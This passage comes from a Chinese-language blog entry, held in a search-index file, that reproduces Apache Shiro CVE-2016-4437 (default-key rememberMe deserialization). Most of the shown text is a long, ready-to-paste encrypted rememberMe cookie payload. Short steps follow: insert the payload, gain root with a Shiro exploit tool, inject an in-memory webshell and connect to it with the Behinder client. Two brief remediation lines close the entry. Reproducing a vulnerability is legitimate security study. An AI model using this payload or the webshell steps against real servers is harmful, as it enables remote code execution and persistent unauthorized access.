class="hljs-string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(payload.decode()))<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">rememberMe=atvw7IWDT663MDSftXLkGwRlhRivt+IkfHZ3HuZY1c6wgYaljM<span class="hljs-regexp">/kGC4kgtIoW5pZYpMIt/</span>Kl<span class="hljs-regexp">/Rcgr8PPhwwr5KzSKSq+re8fRyR5AN/</span>XqsCyCcQtxMxrkuWsEld3Ps0NUgTPGTW5xrt6UxtTmxFQzNS2OhIPIQYUpfPIA0vZsLQn7IJ0yeAbEHG5<span class="hljs-regexp">/Kq0Nk9YBehKtsWDNyTEG/</span>hH0d<span class="hljs-regexp">/gXDxxYa6g9MJ3BrpXOSZ3Up48g2i5JfNAfqkSTUMG7EAYw+yaD5ISmnGXvM6jFcLMqcOlGEnwtlky/</span>n2Du6Se+Rxlp4ZJqRB90xMb1I7OQBWDFnEDeKQ7ErCp2jaiw2mqnBv+nK5Wukh4rq6N0NIyehzWg<span class="hljs-regexp">/pUG+8zwgPJrlLFYmqqnX5f3o9/y</span>4M1Nct0GbF0K4zY4VJgHBZDRTTdZOEMgPvpDcupF3ueTht5ERSN79TZWUxr56Pj7<span class="hljs-regexp">/M4WcG/</span>T5wAsOXylq+fJv9orKCS2tUUPeRrnt7eTEq6CqfJgF3aaZq0dkLx5wQEOM2+<span class="hljs-number">89</span>uN87bBBm77I7PLxc3gPckPdQYGvM6gW7nTc6PwsxBQncDwaAbz3EkAL9APlwQ9ZkW5xm3DjY8eYhnkNZXIKM14CiFjv9MZsRHx6x9Vtzdaf52q<span class="hljs-regexp">/xC+MpKczzP41e94YwsjfihH+LHiv8OjGm3Qef+qhO/</span>llkszNrxwaLGYATlm68tNe36SXi5FWqyZUCpNppN4LZwnvDRL4XxEwZSEZ+FwLB9h7OJAW6DTSZbfJqVDcYL8arCwVh4DfI4hqTSoIscP37ZpXJ6P6TtHxu7psg2zxDMR7gMCX01kIdHSHNCeh1LiZIyEd4oqRbEZMoQMnOxrrW1IC5qKq0HERkMX3Exw5GcgQPqnA<span class="hljs-regexp">/bMqp3G6ymejtAV1e2o8qsZe+qALVx1s8k7Esw/i</span>oNBFFCf4XJZk5EInxF90ewUiLe6hRhyMYmyAP9qnKL8Dutbse<span class="hljs-regexp">/YErEP7bdQBRw7J8Nx95iXuahxlM1WMX4TxAeFwOF28sdWvz9drUZoop7CtGkIQ1pJrWFE1BId91KJECchZHoyoSodU5jqxLRJTF9fCn+ltc6pige0DhmT1BFvpZAFg0hb4/</span>YLOHYj4PKheCAVfeimHEhBx8B0q8uo87VP9KPmajgwopqRHv3UGYIqVK1fAj3t<span class="hljs-regexp">/jdrUcU1Fu7wwHjadeayi2MsA7KW4rrinWcY0ZXjtvGUk7vMYAWQt8l+tp3cPAkbk/g</span>8Jwhv66d4ThICGwp94ZoRE7yrRE2wFHU58C+hD2nPtw1bWK2RygIB82bRUzMepyFdK8KaOEm<span class="hljs-regexp">/jALF9zrmqlhX1NZpI0smX7xxqpijRq6XB/</span>YA04cxyNxFSuPXRy6iSlSlirktiG8e5rJ4zTka+U0eVU<span class="hljs-regexp">/h4SJAGuaDUc+RZKcTxE3U/</span><span class="hljs-number">7</span>rNVjL0jI556zfGLKLKEtLQ+VyleSiHP8Ony9tie4oQmOT3i4x0MJTUsrGJKC63DKN6uM+F+HwjGUIUTNkF0LvIOj3xlEj4vKTtjI+oe+<span class="hljs-number">0</span>OInPIRACXl0cBbsE0bDLq7hpJlJeBmodM9NrsJWBeBYIKOU8TsIAFihzoGb<span class="hljs-regexp">/7/</span>UQFdfpuLANKrrF7Ly1XZrJMkPbPIX0zAhmEqxAMYf8zaCeJfYh9UnBFFe2piyd2FAI23W8Xm4PZ<span class="hljs-regexp">/X+DlbSbc2GmCQw+YaLwnRTRtRD7OHAiv9rSh2EHrTcjKVL+HYVczJ7xZjJTHC/i</span>KNLlaIFFR8DdVTx+dHq954EljSpWAb36IJyqmfR7b3pLJDxm4UfU7YbBDrceTpBNKFsUP1U+cIf5w+ZRthmrK7+R+THOH0pdEKLithObP0YVXqN9o6dpTl36Wz93dnAjAjnpTtKKJZlHR1mHPFUxhyNejHLkh6Rb7p99MA1ts9UrCJqufDPJAKy<span class="hljs-regexp">/VbNXW1tHkNHpS15xLmhpid4mvWw3UnBHyTYl7MDuYguWc25vwFm0P4ptHfyFkRMZBmSRFwNfL7GzuT3b0KshSVrYKh3g/</span>hMPZdjctu73jJbdQs5Pn+<span class="hljs-number">9</span>EI8WaobZ831WNxneDIAYj8Yc8WeD1BmKoGSkFVXtYzuAcr5FpIpgjnVmcxH+ZoOldL5YnClZ9jQ9a2n3AJQIiDwstyV8etQWmjtRAhl6OZvYJnUgVzxh8x2tYh2DumEvEQN1YjOiTjZOnh+a7cJHwpPNmpo7s4UH+<span class="hljs-regexp">/rMl7JyDONAsf1pr0u+YTXxXr5rS8WVfb9QS61IJB4xqttn0TAifUzzwcFpg4+QS+WpaKOwwQtV68+ph5k8wh8rNfC2VE5qdXHiUsPquDCuU7zzZyWXPZq/y</span>hH1Nwoe1Ri7ZL3hsJOikW<span class="hljs-regexp">/y+C7TaeIPnCSiuHaO/</span>P8IVSwdeqEMEhMNmGRAlKxdmFuSloeQXJ8g<span class="hljs-regexp">/+YmwhS+lWxsIOyypbyxF6MEyT4XG4MQBrHyqWaKO63ktlDP5oln7Wg1JQdQAzR1dzm2t4ZeOmKkulRjBHbBz96RPXdjq45vpg2CR2KFg7YG02n0DPrxs3KqZUQ6WnWfOhQVfg02SZw+WpjxvwjpXou/</span>KMX4y8aoGUPI0fxmrz0dzS51MIzk2tIfrmpWIruZcgTIl3N6qplVYReEA<span class="hljs-regexp">/rhqK5dSLPIvVpKSLYl/</span>e+K6FS8tQzIKV<span class="hljs-regexp">/+j3RXmQF5aSct8ALwOgyAwUtfZAK2Rro7b+sGriqzvdPj6+DmM0rHOTixO4h1uJA7WEzp8LDVQrifZcqdSUHKWwSKlay2qKj6nwd3M2snwEiPT0hXKmNjdDYAnmSAdmx2bdoK3TcPjyHtJdpJeaThliVWP/</span>sJUZlE2bcysdwuq<span class="hljs-regexp">/JUiORWKEm1qyElKJYZiSLKLojhWRX0wUu0QYNjOhK+fvXl75C/</span>eSNi7xHUWDGdfBIDvvgToNSywRN0ql9hQGJ<span class="hljs-regexp">/HcKmnDbYb/</span>CCRmPWdBeMs8tAP9L8aSp0EGHKgwXtT8x54eUdJ3nn<span class="hljs-regexp">/zGl7N+Dbn8JmDu5F/</span>KrNLHuOgB7m<span class="hljs-regexp">/jBXj/</span>Z<span class="hljs-regexp">/w+mydEo7cvwmhAZtf51eY6qEpmjtgPwuhm7PVKL10Laa37j4SE0rnP+D0+6tj2mgd7P90zV5VGpaiwgg+yT5Mr8dKipKLuef9Gd02xopfSLihtloU36MvLgmtNg5C2rsKu/</span>ZZFSVHYrKfHYQNLmLugxfquGJ0Sdu<span class="hljs-regexp">/h/</span><span class="hljs-number">74</span>oRlCClWoV+rNwLahkrlHjTMl0bfbvCnrvGK17r7m9XI19wGDs7fBo+y9UXNBIXrMTnbyhpKrsTqBOYcEANDWCOcSc9XauJgci<span class="hljs-regexp">//</span>RMlhDPwALStugCGBTj+<span class="hljs-number">9</span>vTsOrdcs6ybyXHctq8GxanFl57acLh1+<span class="hljs-number">55</span>IhKC8A05pXnqqoCBRdyT6O218<span class="hljs-regexp">/IqN/</span>+a+XKZgY2cf6TpmQn3BNs+m+HduMhLB338uCxuDLahxJ3<span class="hljs-regexp">/3zp2YSOn5uUymh4diSVW4SAV1Hjy+zSZwSbg5wnbN4v7R84/</span>Dk6MXUZd1ubi27uFsyjO066B3WQJN3bw<span class="hljs-regexp">/80FsuwFXqbvwJ7iaSgons6fKY2XCkH7aCfsM4A0MZDVx+GO6VM+X5j8l9IjE7w0PlLF/</span>zX9kMr0ocdr/EXNfDaE2TPSNwZDFhQjiTiht4huYswOb+Wa7iwkq0TUI7wB5qtq+qetfrODJhkQikuJaC1w18eMeRggm9slcshCLerKM3uZlXVVw7bXu+i4AI9au48+GqYbUnrtSnW+P0jfB0qBfhr1Jl3jbRI2FyfezYTbiIghK8oZ2KSVPwdooELG5mxSaIfAJ7s1+lOVoYxTscI2H4nh5if2nPHkFvM5odrKAaGgo1jg==<br></code></pre></td></tr></table></figure><p>3.在Cookie处填入payload!<img src="/images/Shiro-CVE-2016-4437/image-20250306112846388.png" alt="image-20250306112846388"></p><p>4.shiro利用工具 权限为root</p><p><img src="/images/Shiro-CVE-2016-4437/image-20250306115621653.png" alt="image-20250306115621653"></p><p>执行内存马</p><p><img src="/images/Shiro-CVE-2016-4437/image-20250306120252462.png" alt="image-20250306120252462"></p><p>冰蝎连接上</p><p><img src="/images/Shiro-CVE-2016-4437/image-20250306120324856.png" alt="image-20250306120324856"></p><p>5.漏洞修复</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>.Shiro版本&gt;<span class="hljs-number">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">4</span><br><span class="hljs-attribute">2</span>.修改密钥<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>shiro</tag>
      
      <tag>默认密钥爆破</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
